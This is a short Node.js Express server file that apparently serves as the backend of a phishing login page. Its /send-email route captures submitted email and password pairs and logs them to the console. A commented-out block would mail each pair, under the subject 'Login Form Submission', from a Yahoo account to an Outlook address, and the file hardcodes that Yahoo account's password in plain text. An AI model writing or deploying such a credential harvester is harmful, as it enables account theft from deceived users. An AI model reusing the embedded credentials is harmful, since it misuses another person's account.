import express from "express";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";

const app = express();
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/send-email", (req, res) => {
  const { email, password } = req.body;
  //   const transporter = nodemailer.createTransport({
  //     service: "yahoo",
  //     auth: {
  //       user: "sewoyebaaa@yahoo.com",
  //       pass: "HOOyahlawan",
  //     },
  //   });

  //   const mailOptions = {
  //     from: "sewoyebaaa@yahoo.com",
  //     to: "sewoyebaa@outlook.com",
  //     subject: "Login Form Submission",
  //     text: `Email: ${email}, Password: ${password}`,
  //   };

  //   transporter.sendMail(mailOptions, (error, info) => {
  //     if (error) {
  //       return res.status(500).send(error);
  //     }

  //     res.send(`Email sent: ${info.response}`);
  //   });

  console.log(`Email: ${email}, Password: ${password}`);
});

app.listen(5000, () => {
  console.log("Server running on port 5000");
});
